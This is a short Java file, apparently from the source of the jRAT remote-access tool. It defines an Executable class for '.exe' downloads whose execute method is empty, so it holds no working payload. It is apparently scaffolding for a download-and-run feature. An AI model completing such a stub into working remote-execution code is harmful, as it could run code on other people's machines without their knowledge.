package pro.jrat.common.downloadable;

import java.io.File;

public class Executable extends Downloadable {

	@Override
	public String getExtension() {
		return ".exe";
	}

	@Override
	public void execute(File file) throws Exception {

	}

}
